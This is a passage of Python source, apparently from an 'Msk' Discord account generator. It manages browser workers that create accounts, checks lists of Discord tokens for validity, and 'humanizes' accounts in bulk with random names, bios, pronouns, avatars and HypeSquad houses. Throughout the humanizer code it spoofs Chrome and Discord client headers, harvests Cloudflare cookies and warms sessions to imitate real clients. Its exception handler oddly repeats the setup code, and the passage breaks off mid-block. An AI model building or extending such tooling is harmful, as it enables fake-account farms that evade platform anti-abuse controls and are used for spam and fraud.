                    if t.is_alive():
                        if curr_time - start_t > 300:
                            _P = MskColor.PRIMARY; _D = MskColor.DIM; _R = MskColor.RESET
                            controller.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} {MskColor.YELLOW}Worker {wid} timed out after 5 minutes, force closing.{_R}", "warning")
                            # Force close the browser for this worker
                            with gen.lock:
                                ctx = gen._browser_contexts.pop(wid, None)
                            if ctx:
                                try:
                                    ctx.__exit__(None, None, None)
                                except Exception:
                                    pass
                            completed += 1
                        else:
                            still_active.append((t, wid, snap, start_t))
                    else:
                        completed += 1
                        if self._stats.get("valid", 0) > snap:
                            consecutive_fails = 0
                        else:
                            consecutive_fails += 1
                active_threads = still_active
                time.sleep(0.5)

            if not gen.should_stop:
                for t, wid, snap, start_t in active_threads:
                    t.join(timeout=10)
            else:
                gen.force_close_all_browsers()
                _kill_gen_browsers_only()
                # Wait briefly for workers to exit after browsers are killed
                for t, wid, snap, start_t in active_threads:
                    t.join(timeout=3)

            from .MskColors.color import MskColor as _MC
            _P = _MC.PRIMARY; _D = _MC.DIM; _R = _MC.RESET
            _msk = f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} "
            self.log(f"{_msk}{_MC.GREEN}Generation complete! Valid: {self._stats['valid']}, Invalid: {self._stats['invalid']}, Locked: {self._stats['locked']}{_R}", "success")

            _elapsed = time.time() - self._stats.get("start_time", time.time())
            threading.Thread(
                target=self._send_session_complete_webhook,
                args=(token_count, _elapsed),
                daemon=True
            ).start()

        except Exception as e:
            from .MskColors.color import MskColor as _MC
            _P = _MC.PRIMARY; _D = _MC.DIM; _R = _MC.RESET
            _msk = f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} "
            self.log(f"{_msk}{_MC.RED}Generator error: {str(e)}{_R}", "error")
        finally:
            try:
                from .WorkFlow.email_pool import EmailPool
                EmailPool.reset()
            except Exception:
                pass
            try:
                Logger.queue_log = classmethod(original_queue_log)
                Logger.queue_stats = classmethod(original_queue_stats)
            except:
                pass
            # Clear the pre-stop flag so a fresh Start after this thread
            # exits does not immediately abort.
            self._pre_stop = False
            # Clear the active generator reference so the next start_generator
            # call does not see a stale object with should_stop=True, which would
            # trigger a spurious 5-second wait before the new run begins.
            self._active_generator = None

    def stop_generator(self) -> Dict:
        with self._gen_state_lock:
            if not (self._generator_thread and self._generator_thread.is_alive()):
                self._pre_stop = False
                return {"success": True}
            # Set pre_stop FIRST so if _active_generator isn't assigned yet
            # (thread still initializing), it will pick it up at startup.
            self._pre_stop = True
            gen = getattr(self, '_active_generator', None)
            if gen:
                gen.should_stop = True
                # Actually close all browser contexts (not just clear dict)
                try:
                    gen.force_close_all_browsers()
                except Exception:
                    pass

        # Kill browser OS processes immediately â€” don't wait for graceful close
        _kill_gen_browsers_only()

        from .MskColors.color import MskColor as _MC
        _P = _MC.PRIMARY; _D = _MC.DIM; _R = _MC.RESET
        self.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} {_MC.YELLOW}Stopped By User{_R}", "warning")

        # Wait for the coordinator thread to actually finish (up to 10s)
        thread = self._generator_thread
        if thread:
            thread.join(timeout=10)
            if thread.is_alive():
                self.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} {_MC.YELLOW}Stop requested but some tasks are still finishing...{_R}", "warning")
                # Second kill attempt after giving contexts time to release
                _kill_gen_browsers_only()
                thread.join(timeout=5)

        fully_stopped = not (thread and thread.is_alive())
        if fully_stopped:
            self.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} {_MC.GREEN}All tasks stopped successfully{_R}", "success")
        else:
            self.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} {_MC.YELLOW}Stop completed but some background tasks may still be cleaning up{_R}", "warning")

        return {"success": True, "stopped": fully_stopped}

    def check_checker_files(self) -> Dict:
        """Check which checker output files already have content."""
        files_info = []
        for fname in ["checked_valid.txt", "checked_invalid.txt", "locked.txt"]:
            try:
                path = get_resource_path(f"data/output/{fname}")
                if os.path.exists(path):
                    with open(path, "r", encoding="utf-8") as f:
                        lines = [l.strip() for l in f if l.strip()]
                    files_info.append({"name": fname, "count": len(lines)})
                else:
                    files_info.append({"name": fname, "count": 0})
            except Exception:
                files_info.append({"name": fname, "count": 0})
        return {"files": files_info}

    def start_checker(self, tokens: List[str], clean_old: bool = False) -> Dict:
        if self._checker_thread and self._checker_thread.is_alive():
            return {"success": False, "error": "Checker already running"}

        self._checker_running = True
        self._checker_stats = {
            "valid": 0,
            "locked": 0,
            "invalid": 0,
            "total": len(tokens),
            "current": 0
        }

        if clean_old:
            for fname in ["checked_valid.txt", "checked_invalid.txt", "locked.txt"]:
                try:
                    path = get_resource_path(f"data/output/{fname}")
                    if os.path.exists(path):
                        open(path, "w").close()
                except Exception:
                    pass

        self._checker_thread = threading.Thread(
            target=self._run_checker,
            args=(tokens, clean_old),
            daemon=True
        )
        self._checker_thread.start()
        return {"success": True}

    def _run_checker(self, tokens: List[str], clean_old: bool = False):
        try:
            from .Utils.utils import Utils

            valid_path = get_resource_path("data/output/checked_valid.txt")
            invalid_path = get_resource_path("data/output/checked_invalid.txt")
            locked_path = get_resource_path("data/output/locked.txt")

            os.makedirs(os.path.dirname(valid_path), exist_ok=True)

            existing_valid = set()
            existing_locked = set()
            existing_invalid = set()
            if not clean_old:
                for path, s in [(valid_path, existing_valid), (locked_path, existing_locked), (invalid_path, existing_invalid)]:
                    if os.path.exists(path):
                        with open(path, "r", encoding="utf-8") as f:
                            for line in f:
                                line = line.strip()
                                if line:
                                    tok = line.split(":")[-1].strip() if ":" in line else line
                                    s.add(tok)

            for i, token_line in enumerate(tokens):
                if not self._checker_running:
                    break

                token_line = token_line.strip()
                if not token_line:
                    continue

                if ':' in token_line:
                    parts = token_line.split(':')
                    import re
                    token_pattern = re.compile(r'^[\w-]{24,}\.[\w-]{6,}\.[\w-]{25,}|^[\d]{17,20}\.[\w-]{25,}')
                    token = parts[-1].strip()
                    for part in parts:
                        part = part.strip()
                        if token_pattern.search(part):
                            token = part
                            break
                    if token == parts[-1].strip():
                        candidates = [p.strip() for p in parts if '@' not in p]
                        if candidates:
                            for c in candidates:
                                if '.' in c and len(c) > 40:
                                    token = c
                                    break
                            else:
                                token = max(candidates, key=len)
                else:
                    token = token_line

                try:
                    proxy = None
                    result = Utils.check_discord_token(token=token, proxy=proxy)
                    status = result.get("status", "Invalid")

                    from .MskColors.color import MskColor
                    NEON_GREEN = "\033[38;2;57;255;20m"
                    NEON_RED = "\033[38;2;255;49;49m"
                    ORANGE = "\033[38;2;255;165;0m"

                    if status == "Valid":
                        self._checker_stats["valid"] += 1
                        if token not in existing_valid:
                            existing_valid.add(token)
                            with open(valid_path, "a", encoding="utf-8") as f:
                                f.write(f"{token_line}\n")
                            self.log(f"{MskColor.PRIMARY}[{MskColor.RESET}{i+1}/{len(tokens)}{MskColor.PRIMARY}]{MskColor.RESET} {MskColor.GREEN}Valid{MskColor.RESET} {NEON_GREEN}{token[:10]}***{MskColor.RESET}", "info")
                        else:
                            self._checker_stats.setdefault("duplicates", 0)
                            self._checker_stats["duplicates"] += 1
                            self.log(f"{MskColor.PRIMARY}[{MskColor.RESET}{i+1}/{len(tokens)}{MskColor.PRIMARY}]{MskColor.RESET} {MskColor.GREEN}Valid (Dup){MskColor.RESET} {NEON_GREEN}{token[:10]}***{MskColor.RESET}", "info")

                    elif status == "Locked":
                        self._checker_stats["locked"] += 1
                        if token not in existing_locked:
                            existing_locked.add(token)
                            with open(locked_path, "a", encoding="utf-8") as f:
                                f.write(f"{token_line}\n")
                            self.log(f"{MskColor.PRIMARY}[{MskColor.RESET}{i+1}/{len(tokens)}{MskColor.PRIMARY}]{MskColor.RESET} {ORANGE}Locked{MskColor.RESET} {ORANGE}{token[:10]}***{MskColor.RESET}", "info")
                        else:
                            self._checker_stats.setdefault("duplicates", 0)
                            self._checker_stats["duplicates"] += 1
                            self.log(f"{MskColor.PRIMARY}[{MskColor.RESET}{i+1}/{len(tokens)}{MskColor.PRIMARY}]{MskColor.RESET} {ORANGE}Locked (Dup){MskColor.RESET} {ORANGE}{token[:10]}***{MskColor.RESET}", "info")

                    else:
                        self._checker_stats["invalid"] += 1
                        if token not in existing_invalid:
                            existing_invalid.add(token)
                            with open(invalid_path, "a", encoding="utf-8") as f:
                                f.write(f"{token_line}\n")
                            self.log(f"{MskColor.PRIMARY}[{MskColor.RESET}{i+1}/{len(tokens)}{MskColor.PRIMARY}]{MskColor.RESET} {MskColor.RED}Invalid{MskColor.RESET} {NEON_RED}{token[:10]}***{MskColor.RESET}", "info")
                        else:
                            self._checker_stats.setdefault("duplicates", 0)
                            self._checker_stats["duplicates"] += 1
                            self.log(f"{MskColor.PRIMARY}[{MskColor.RESET}{i+1}/{len(tokens)}{MskColor.PRIMARY}]{MskColor.RESET} {MskColor.RED}Invalid (Dup){MskColor.RESET} {NEON_RED}{token[:10]}***{MskColor.RESET}", "info")

                except Exception as e:
                    self._checker_stats["invalid"] += 1
                    self.log(f"{MskColor.PRIMARY}[{MskColor.RESET}{i+1}/{len(tokens)}{MskColor.PRIMARY}]{MskColor.RESET} {MskColor.RED}Error: {str(e)[:80]}{MskColor.RESET}", "error")

                self._checker_stats["current"] = i + 1
                time.sleep(0.0)

            self._checker_running = False

            from .MskColors.color import MskColor as _MC
            _P = _MC.PRIMARY; _D = _MC.DIM; _R = _MC.RESET
            _msk = f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} "
            self.log(f"{_msk}{_MC.GREEN}Checker complete! Valid: {self._checker_stats['valid']}, Locked: {self._checker_stats['locked']}, Invalid: {self._checker_stats['invalid']}{_R}", "success")

        except Exception as e:
            self._checker_running = False
            from .MskColors.color import MskColor as _MC
            _P = _MC.PRIMARY; _D = _MC.DIM; _R = _MC.RESET
            _msk = f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} "
            self.log(f"{_msk}{_MC.RED}Checker error: {str(e)}{_R}", "error")

    def get_supported_languages(self) -> Dict:
        try:
            from deep_translator import GoogleTranslator
            langs = GoogleTranslator().get_supported_languages(as_dict=True)
            sorted_langs = sorted([{"name": k.capitalize(), "code": v} for k, v in langs.items()], key=lambda x: x["name"])
            return {"success": True, "languages": sorted_langs}
        except Exception as e:
            common = [
                {"name": "English", "code": "en"},
                {"name": "Italian", "code": "it"},
                {"name": "French", "code": "fr"},
                {"name": "German", "code": "de"},
                {"name": "Spanish", "code": "es"},
                {"name": "Portuguese", "code": "pt"},
                {"name": "Russian", "code": "ru"},
                {"name": "Chinese", "code": "zh-CN"},
                {"name": "Japanese", "code": "ja"},
                {"name": "Korean", "code": "ko"}
            ]
            return {"success": True, "languages": common, "warning": str(e)}

    def _load_translations(self) -> Dict:
        """Load from disk only once, then use in-memory cache."""
        if not hasattr(self, '_translation_cache') or self._translation_cache is None:
            cache_path = get_resource_path("data/translations.json")
            if os.path.exists(cache_path):
                try:
                    with open(cache_path, "r", encoding="utf-8") as f:
                        self._translation_cache = json.load(f)
                except:
                    self._translation_cache = {}
            else:
                self._translation_cache = {}
        return self._translation_cache

    def _save_translations(self, cache: Dict):
        """Save to disk (debounced - only writes when new translations arrive)."""
        self._translation_cache = cache
        cache_path = get_resource_path("data/translations.json")
        try:
            os.makedirs(os.path.dirname(cache_path), exist_ok=True)
            with open(cache_path, "w", encoding="utf-8") as f:
                json.dump(cache, f, ensure_ascii=False, indent=2)
        except:
            pass

    def translate_texts(self, texts: List[str], target_lang: str) -> Dict:
        if not texts:
            return {"success": True, "translations": []}
        if target_lang == "en":
            return {"success": True, "translations": texts}

        cache = self._load_translations()
        if target_lang not in cache:
            cache[target_lang] = {}

        translations = []
        texts_to_translate = []
        indices_to_translate = []

        for i, text in enumerate(texts):
            if text in cache[target_lang]:
                translations.append(cache[target_lang][text])
            else:
                translations.append(None)
                texts_to_translate.append(text)
                indices_to_translate.append(i)

        if not texts_to_translate:
            return {"success": True, "translations": translations}

        try:
            from deep_translator import GoogleTranslator
            translator = GoogleTranslator(source='en', target=target_lang)

            chunk_size = 80

            for i in range(0, len(texts_to_translate), chunk_size):
                chunk = texts_to_translate[i:i + chunk_size]
                try:
                    chunk_translations = translator.translate_batch(chunk)

                    if not chunk_translations or len(chunk_translations) != len(chunk):
                        chunk_translations = []
                        for txt in chunk:
                            try:
                                chunk_translations.append(translator.translate(txt))
                            except:
                                chunk_translations.append(txt)

                    for j, trans in enumerate(chunk_translations):
                        original_idx = indices_to_translate[i + j]
                        translations[original_idx] = trans
                        cache[target_lang][chunk[j]] = trans

                except Exception as e:
                    print(f"Batch translation error: {e}")
                    for j, txt in enumerate(chunk):
                        original_idx = indices_to_translate[i + j]
                        try:
                            trans = translator.translate(txt)
                        except:
                            trans = txt
                        translations[original_idx] = trans
                        cache[target_lang][txt] = trans

            self._save_translations(cache)
            return {"success": True, "translations": translations}

        except Exception as e:
            print(f"Translation error: {str(e)}")
            for idx in indices_to_translate:
                if translations[idx] is None:
                    translations[idx] = texts[idx]
            return {"success": False, "error": str(e), "translations": translations}

    def stop_checker(self) -> Dict:
        self._checker_running = False
        return {"success": True}

    def get_humanizer_stats(self) -> dict:
        stats = dict(getattr(self, '_humanizer_stats', {
            'success': 0, 'failed': 0, 'skipped': 0, 'total': 0, 'current': 0
        }))
        stats["running"] = bool(getattr(self, '_humanizer_thread', None) and self._humanizer_thread.is_alive())
        return stats

    def start_humanizer(self, tokens: list) -> dict:
        if getattr(self, '_humanizer_thread', None) and self._humanizer_thread.is_alive():
            return {"success": False, "error": "Humanizer already running"}
        if not tokens:
            return {"success": False, "error": "No tokens provided"}
        self._humanizer_running = True
        self._humanizer_stats = {'success': 0, 'failed': 0, 'skipped': 0, 'total': len(tokens), 'current': 0}
        import threading as _thr
        self._humanizer_thread = _thr.Thread(target=self._run_humanizer, args=(tokens,), daemon=True)
        self._humanizer_thread.start()
        return {"success": True}

    def stop_humanizer(self) -> dict:
        self._humanizer_running = False
        return {"success": True}

    def _run_humanizer(self, tokens: list):
        """Humanize existing tokens using primp + Gateway WebSocket session.

        Uses the same proven method as the after-gen humanizer:
        primp for HTTP requests + DiscordGatewaySession to keep
        the token "online" during API calls.
        """
        try:
            import random, time, os
            from random import uniform
            from .MskColors.color import MskColor
            from .Utils.utils import get_resource_path
            from .Helper.huminazer import (
                DiscordGatewaySession,
                _humanizer_fetch_build_number,
                set_discord_avatar, set_discord_bio,
                set_hypesquad, set_pronouns, set_display_name,
            )

            h = self._settings.get('humanizer', {})
            do_avatar   = h.get('avatar', True)
            do_bio      = h.get('bio', True)
            do_pronouns = h.get('pronouns', True)
            do_display  = h.get('display_name', True)
            do_hype     = h.get('hypesquad', True)

            output_path = get_resource_path('data/output/humanized.txt')
            os.makedirs(os.path.dirname(output_path), exist_ok=True)

            avatars_dir = get_resource_path('data/input/profiles/avatars')
            avatar_files = []
            if do_avatar and os.path.exists(avatars_dir):
                avatar_files = [f for f in os.listdir(avatars_dir)
                                if f.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp'))]

            bio_lines = []
            if do_bio:
                for bp in [get_resource_path('data/input/profiles/bio.txt'),
                           get_resource_path('data/input/bio.txt')]:
                    if os.path.exists(bp):
                        with open(bp, 'r', encoding='utf-8') as bf:
                            bio_lines = [l.strip() for l in bf if l.strip()]
                        if bio_lines:
                            break

            name_lines = []
            if do_display:
                for np_ in [get_resource_path('data/input/profiles/names.txt'),
                            get_resource_path('data/input/names.txt')]:
                    if os.path.exists(np_):
                        with open(np_, 'r', encoding='utf-8') as nf:
                            name_lines = [l.strip() for l in nf if l.strip()]
                        if name_lines:
                            break

            pronouns_options = []
            if do_pronouns:
                for pp in [get_resource_path('data/input/profiles/pronouns.txt'),
                           get_resource_path('data/input/pronouns.txt')]:
                    if os.path.exists(pp):
                        with open(pp, 'r', encoding='utf-8') as pf:
                            pronouns_options = [l.strip() for l in pf if l.strip()]
                        if pronouns_options:
                            break
                if not pronouns_options:
                    pronouns_options = ['he/him', 'she/her', 'they/them', 'he/they', 'she/they']

            build_num = _humanizer_fetch_build_number()

            def _human_delay(min_s=0.8, max_s=2.5):
                time.sleep(uniform(min_s, max_s))

            for i, token_line in enumerate(tokens):
                if not getattr(self, '_humanizer_running', False):
                    break
                token_line = token_line.strip()
                if not token_line:
                    self._humanizer_stats['skipped'] += 1
                    self._humanizer_stats['current'] = i + 1
                    continue

                if ':' in token_line:
                    parts = token_line.split(':')
                    import re
                    token_pattern = re.compile(r'^[\w-]{24,}\.[\w-]{6,}\.[\w-]{25,}|^[\d]{17,20}\.[\w-]{25,}')
                    token = parts[-1].strip()
                    for part in parts:
                        part = part.strip()
                        if token_pattern.search(part):
                            token = part
                            break
                    if token == parts[-1].strip():
                        candidates = [p.strip() for p in parts if '@' not in p]
                        if candidates:
                            for c in candidates:
                                if '.' in c and len(c) > 40:
                                    token = c
                                    break
                            else:
                                token = max(candidates, key=len)
                else:
                    token = token_line
                succeeded = []
                failed_parts = []

                gw = None
                session_id = None
                try:
                    gw = DiscordGatewaySession(token, build_num)
                    gw_ok = gw.connect(timeout=15)
                    if gw_ok:
                        try:
                            session_id = gw._session_id
                        except Exception:
                            pass
                except Exception:
                    gw = None

                _human_delay(0.5, 1.2)

                # Build headers once with the gateway session_id so that
                # profile endpoint calls (bio/pronouns) are accepted by Discord
                from .Helper.huminazer import (
                    _humanizer_headers as _hum_headers,
                    _humanizer_patch as _hum_patch,
                    _humanizer_post as _hum_post,
                    _check_captcha as _hum_captcha,
                )
                _gw_headers = _hum_headers(token, build_num, session_id=session_id)

                try:
                    if do_display:
                        name_val = random.choice(name_lines)[:32] if name_lines else ''.join(
                            random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(6, 12)))
                        _human_delay(0.6, 1.2)
                        r = _hum_patch(
                            "https://discord.com/api/v9/users/@me",
                            {"global_name": name_val},
                            _gw_headers
                        )
                        if r and r.status_code in (200, 201, 204) and not _hum_captcha(r):
                            succeeded.append('name')
                        else:
                            failed_parts.append('name')

                    # Bio + pronouns batched into ONE PATCH to /users/@me/profile
                    # with x-session-id header â€” separate calls without session_id
                    # return HTTP 200 but Discord silently discards them.
                    _profile_payload = {}
                    if do_bio and bio_lines:
                        _profile_payload["bio"] = random.choice(bio_lines)[:190]
                    if do_pronouns:
                        _profile_payload["pronouns"] = random.choice(pronouns_options)
                    if _profile_payload:
                        _human_delay(0.5, 1.0)
                        r = _hum_patch(
                            "https://discord.com/api/v9/users/@me/profile",
                            _profile_payload,
                            _gw_headers
                        )
                        _ok = r and r.status_code in (200, 201, 204) and not _hum_captcha(r)
                        if "bio" in _profile_payload:
                            (succeeded if _ok else failed_parts).append('bio')
                        if "pronouns" in _profile_payload:
                            (succeeded if _ok else failed_parts).append('pronouns')
                    elif do_bio and not bio_lines:
                        pass  # logged below as skipped

                    if do_hype:
                        _human_delay(0.5, 1.5)
                        r = _hum_post(
                            "https://discord.com/api/v9/hypesquad/online",
                            {"house_id": random.randint(1, 3)},
                            _gw_headers
                        )
                        if r and r.status_code in (200, 201, 204) and not _hum_captcha(r):
                            succeeded.append('hypesquad')
                        else:
                            failed_parts.append('hypesquad')

                    if do_avatar and avatar_files:
                        _human_delay(1.0, 2.0)
                        import base64 as _b64, io as _io
                        from PIL import Image as _PILImg
                        pool = [f for f in getattr(self, '_selected_avatars', []) if f in avatar_files] or avatar_files
                        av_file = os.path.join(avatars_dir, random.choice(pool))
                        if os.path.exists(av_file):
                            try:
                                with _PILImg.open(av_file) as img:
                                    img = img.convert('RGB')
                                    img = img.resize((256, 256), _PILImg.LANCZOS)
                                    buf = _io.BytesIO()
                                    img.save(buf, format='JPEG', quality=85)
                                    raw = buf.getvalue()
                                    q = 70
                                    while len(raw) > 2_000_000 and q > 20:
                                        buf = _io.BytesIO()
                                        img.save(buf, format='JPEG', quality=q)
                                        raw = buf.getvalue()
                                        q -= 10
                                av_b64 = base64.b64encode(raw).decode()
                                r = _hum_patch(
                                    "https://discord.com/api/v9/users/@me",
                                    {"avatar": f"data:image/jpeg;base64,{av_b64}"},
                                    _gw_headers
                                )
                                if r and r.status_code in (200, 201, 204) and not _hum_captcha(r):
                                    succeeded.append('avatar')
                                else:
                                    failed_parts.append('avatar')
                            except Exception:
                                failed_parts.append('avatar')

                except Exception as err:
                    failed_parts.append('error')
                    # Literal "[Msk] " so utils.js hardcodes the styled tag,
                    # then ANSI codes for [1/1] counter and the rest
                    _c = (f"{MskColor.PRIMARY}[{MskColor.RESET}"
                          f"{i+1}/{len(tokens)}"
                          f"{MskColor.PRIMARY}]{MskColor.RESET}")
                    _t = f"{MskColor.DIM}{token[:10]}***{MskColor.RESET}"
                    self.log(
                        f"[Msk] {_c} {_t} "
                        f"{MskColor.RED}Error: {str(err)[:60]}{MskColor.RESET}", 'error')
                finally:
                    if gw is not None:
                        try:
                            gw.close()
                        except Exception:
                            pass

                is_failed = len(failed_parts) > 0 and len(succeeded) == 0
                self._humanizer_stats['failed' if is_failed else 'success'] += 1
                self._humanizer_stats['current'] = i + 1

                # Log format: [Msk] [1/1] token*** field: status
                # "[Msk] " is a LITERAL prefix â€” utils.js detects it and applies
                # the hardcoded styled tag (#dddddd brackets, #808080 Msk text).
                # [1/1] uses PRIMARY([) + RESET(1/1) + PRIMARY(]) to match that
                # same bracket style; token prefix uses DIM gray.
                _counter = (f"{MskColor.PRIMARY}[{MskColor.RESET}"
                            f"{i+1}/{len(tokens)}"
                            f"{MskColor.PRIMARY}]{MskColor.RESET}")
                _tok_pfx = f"{MskColor.DIM}{token[:10]}***{MskColor.RESET}"
                _prefix  = f"[Msk] {_counter} {_tok_pfx}"

                _field_checks = [
                    ('avatar',    do_avatar    and bool(avatar_files)),
                    ('name',      do_display),
                    ('bio',       do_bio),
                    ('pronouns',  do_pronouns),
                    ('hypesquad', do_hype),
                ]
                for _field, _enabled in _field_checks:
                    if not _enabled:
                        continue
                    if _field in succeeded:
                        self.log(f"{_prefix} {MskColor.GREEN}{_field}: humanized{MskColor.RESET}", 'info')
                    elif _field == 'bio' and do_bio and not bio_lines:
                        self.log(f"{_prefix} {MskColor.YELLOW}bio: skipped (bio.txt not found){MskColor.RESET}", 'warning')
                    else:
                        self.log(f"{_prefix} {MskColor.RED}{_field}: failed{MskColor.RESET}", 'warning')

                if succeeded:
                    with open(output_path, 'a', encoding='utf-8') as outf:
                        outf.write(token_line + '\n')

                _human_delay(1.5, 3.0)

            self._humanizer_running = False
            from .MskColors.color import MskColor as _MC
            _P = _MC.PRIMARY; _D = _MC.DIM; _R = _MC.RESET
            s = self._humanizer_stats
            self.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} {_MC.GREEN}Humanizer done! "
                     f"Success: {s['success']}, Failed: {s['failed']}, Skipped: {s['skipped']}{_R}", 'success')

        except Exception as e:
            self._humanizer_running = False
            from .MskColors.color import MskColor as _MC
            _P = _MC.PRIMARY; _D = _MC.DIM; _R = _MC.RESET
            self.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} {_MC.RED}Humanizer error: {str(e)}{_R}", 'error')

            h = self._settings.get('humanizer', {})
            do_avatar   = h.get('avatar', True)
            do_bio      = h.get('bio', True)
            do_pronouns = h.get('pronouns', True)
            do_display  = h.get('display_name', True)
            do_hype     = h.get('hypesquad', True)

            output_path = get_resource_path('data/output/humanized.txt')
            os.makedirs(os.path.dirname(output_path), exist_ok=True)

            try:
                from .Helper.huminazer import _humanizer_fetch_build_number as _hfbn
                build_num = _hfbn()
                self.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} "
                         f"{_MC.GREEN}Build number: {build_num}{_R}", 'info')
            except Exception:
                build_num = 508210

            avatars_dir = get_resource_path('data/input/profiles/avatars')
            avatar_files = []
            if do_avatar and os.path.exists(avatars_dir):
                avatar_files = [f for f in os.listdir(avatars_dir)
                                if f.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp'))]

            bio_lines = []
            if do_bio:
                for bp in [get_resource_path('data/input/profiles/bio.txt'),
                           get_resource_path('data/input/bio.txt')]:
                    if os.path.exists(bp):
                        with open(bp, 'r', encoding='utf-8') as bf:
                            bio_lines = [l.strip() for l in bf if l.strip()]
                        if bio_lines:
                            break

            name_lines = []
            if do_display:
                for np_ in [get_resource_path('data/input/profiles/names.txt'),
                            get_resource_path('data/input/names.txt')]:
                    if os.path.exists(np_):
                        with open(np_, 'r', encoding='utf-8') as nf:
                            name_lines = [l.strip() for l in nf if l.strip()]
                        if name_lines:
                            break

            pronouns_options = []
            if do_pronouns:
                for pp in [get_resource_path('data/input/profiles/pronouns.txt'),
                           get_resource_path('data/input/pronouns.txt')]:
                    if os.path.exists(pp):
                        with open(pp, 'r', encoding='utf-8') as pf:
                            pronouns_options = [l.strip() for l in pf if l.strip()]
                        if pronouns_options:
                            break
                if not pronouns_options:
                    pronouns_options = ['he/him', 'she/her', 'they/them', 'he/they', 'she/they']

            hype_ids = [1, 2, 3]

            _CHROME_VERSION = "131.0.0.0"
            _USER_AGENT = (
                f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                f"(KHTML, like Gecko) Chrome/{_CHROME_VERSION} Safari/537.36"
            )
            _SEC_CH_UA = f'"Google Chrome";v="131", "Chromium";v="131", "Not/A)Brand";v="99"'

            def _build_sp_b64():
                """Build fresh super-properties each time (unique UUIDs per session)."""
                import uuid as _uuid
                sp_raw = {
                    "os": "Windows",
                    "browser": "Chrome",
                    "device": "",
                    "system_locale": "en-US",
                    "browser_user_agent": _USER_AGENT,
                    "browser_version": _CHROME_VERSION,
                    "os_version": "10",
                    "referrer": "https://discord.com/",
                    "referring_domain": "discord.com",
                    "referrer_current": "",
                    "referring_domain_current": "",
                    "search_engine": "google",
                    "release_channel": "stable",
                    "client_build_number": build_num,
                    "client_event_source": None,
                    "client_launch_id": str(_uuid.uuid4()),
                    "launch_signature": str(_uuid.uuid4()),
                    "client_heartbeat_session_id": str(_uuid.uuid4()),
                    "client_app_state": "focused"
                }
                return base64.b64encode(json.dumps(sp_raw, separators=(',', ':')).encode()).decode()

            def _build_headers(token):
                return {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': 'en-US,en;q=0.9',
                    'authorization': token,
                    'content-type': 'application/json',
                    'origin': 'https://discord.com',
                    'priority': 'u=1, i',
                    'referer': 'https://discord.com/channels/@me',
                    'sec-ch-ua': _SEC_CH_UA,
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': _USER_AGENT,
                    'x-debug-options': 'bugReporterEnabled',
                    'x-discord-locale': 'en-US',
                    'x-discord-timezone': 'America/Los_Angeles',
                    'x-super-properties': _build_sp_b64(),
                }

            def _human_delay(min_s=0.8, max_s=2.5):
                time.sleep(uniform(min_s, max_s))

            def _handle_rate_limit(response):
                """Handle 429 rate limits with retry-after."""
                if response.status_code == 429:
                    try:
                        retry_after = float(response.headers.get('retry-after', 5))
                    except (ValueError, TypeError):
                        retry_after = 5.0
                    time.sleep(retry_after + uniform(0.5, 1.5))
                    return True
                return False

            def _harvest_cf_cookies(session):
                """GET discord.com to collect Cloudflare cookies (__dcfduid, __sdcfduid)."""
                try:
                    session.get(
                        "https://discord.com/",
                        headers={
                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                            "accept-encoding": "gzip, deflate, br, zstd",
                            "accept-language": "en-US,en;q=0.9",
                            "sec-ch-ua": _SEC_CH_UA,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": '"Windows"',
                            "sec-fetch-dest": "document",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-site": "none",
                            "sec-fetch-user": "?1",
                            "upgrade-insecure-requests": "1",
                            "user-agent": _USER_AGENT,
                        },
                        timeout=10,
                    )
                except Exception:
                    pass

            def _warm_session(session, token):
                """
                Multi-step session warming - mimics real client startup:
                  1. GET /users/@me       -> validate token + set session cookies
                  2. GET /users/@me/settings -> client loads settings on startup
                  3. GET /users/@me/affinities/guilds -> client loads affinities
                Returns (is_valid: bool, error_msg: str|None)
                """
                hdrs = _build_headers(token)
                session.headers.update(hdrs)

                try:
                    r = session.get("https://discord.com/api/v9/users/@me", timeout=12)
                    if r.status_code == 401:
                        return False, "Invalid/expired token"
                    if r.status_code == 403:
                        try:
                            _msg = r.json().get("message", "")
                            if "verify your account" in _msg.lower():
                                return False, "Token locked"
                        except Exception:
                            pass
                        return False, "Token locked"
                    if r.status_code == 429:
                        _handle_rate_limit(r)
                        r = session.get("https://discord.com/api/v9/users/@me", timeout=12)
                        if r.status_code not in (200, 204):
                            return False, f"Rate-limited ({r.status_code})"
                except Exception as e:
                    return False, f"Connection error: {str(e)[:40]}"

                _human_delay(0.3, 0.8)

                try:
                    session.get("https://discord.com/api/v9/users/@me/settings", timeout=10)
                except Exception:
                    pass

                _human_delay(0.2, 0.6)

                try:
                    session.get("https://discord.com/api/v9/users/@me/affinities/guilds", timeout=10)
                except Exception:
                    pass

                _human_delay(0.3, 0.7)
                return True, None

            for i, token_line in enumerate(tokens):
                if not getattr(self, '_humanizer_running', False):
                    break
                token_line = token_line.strip()
                if not token_line:
                    self._humanizer_stats['skipped'] += 1
                    self._humanizer_stats['current'] = i + 1
                    continue

                token = token_line.split(':')[-1].strip() if ':' in token_line else token_line
                succeeded = []
                failed_parts = []
                failed_details = {}

                try:
                    if _USE_CFFI:
                        _ctx = cffi_requests.Session(impersonate="chrome131")
                    else:
                        import requests as _req_mod
                        _ctx = _req_mod.Session()

                    with _ctx as session:
